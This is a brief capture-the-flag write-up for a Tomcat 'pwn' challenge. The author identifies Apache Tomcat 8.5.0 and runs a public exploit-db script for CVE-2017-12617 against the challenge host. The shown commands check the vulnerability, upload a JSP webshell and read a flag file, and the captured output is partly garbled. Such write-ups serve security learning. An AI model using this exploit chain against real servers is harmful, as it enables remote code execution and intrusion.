# Challenge

It's happening!! On OCT 31 the annual North Pole Rave will kick off! And DJ Oiler is releasing his new album!
Look here for all the details of the event!

http://santasdisco.norwayeast.azurecontainer.io:8080/

> **Hint:** I wonder why the skit "Dinner for One" comes to mind?

# Writeup

Started by checking the image and source, found nothing. Tried custom urls (added /test) and got an error which gave ``Apache Tomcat/8.5.0`

As this is pwn I guess it is exploit on this older software. Going over to [exploit-db](https://www.exploit-db.com) and searching for Tomcat gave this result:

[Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)](https://www.exploit-db.com/exploits/42966)

Downloaded the python script, saw it takes -u url to check if it is pwnable.

```
$ python3 42966.py -u http://santasdisco.norwayeast.azurecontainer.io:8080/

Poc Filename  Poc.jsp
File Created ..
http://santasdisco.norwayeast.azurecontainer.io:8080/ it's Vulnerable to CVE-2017-12617
http://santasdisco.norwayeast.azurecontainer.io:8080//Poc.jsp
```

Then this script also had possibility for webshell as shown by the --help argument:

```bash
$ python3 42966.py -u http://santasdisco.norwayeast.azurecontainer.io:8080/ -p toffe

Uploading Webshell .....
$ cat /flag.txt
b"
\n    
\n    
\n    
\n    \n    \n
l
```

There we have it. Oh itt kitt that cat? wtf :P 

